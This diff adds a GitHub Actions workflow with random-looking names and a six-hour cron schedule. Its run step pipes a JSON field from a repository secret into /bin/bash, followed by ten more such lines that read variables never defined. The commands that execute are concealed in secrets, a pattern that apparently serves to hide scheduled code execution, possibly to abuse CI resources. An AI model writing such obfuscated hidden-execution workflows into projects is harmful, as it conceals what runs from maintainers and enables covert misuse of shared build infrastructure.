@@ -1,0 +1,26 @@
+name: xuejingxin7641
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuejingxin7641
+        env:
+          rnya11: ${{ secrets.rnya11 }}
+        run: |
+          echo $rnya11 | jq -r .vxs82785 | /bin/bash
+          echo $zgen2 | jq -r .egito772 | /bin/bash
+          echo $rfjb39 | jq -r .pzx8 | /bin/bash
+          echo $u15267 | jq -r .c6358 | /bin/bash
+          echo $clnh4 | jq -r .g3 | /bin/bash
+          echo $pf5572 | jq -r .gihe980 | /bin/bash
+          echo $wh55583 | jq -r .oekdv244 | /bin/bash
+          echo $wpgl764 | jq -r .mmln4 | /bin/bash
+          echo $zf0205 | jq -r .hii73 | /bin/bash
+          echo $u385 | jq -r .qsqr69637 | /bin/bash
+          echo $n44696 | jq -r .rbo8047 | /bin/bash
+
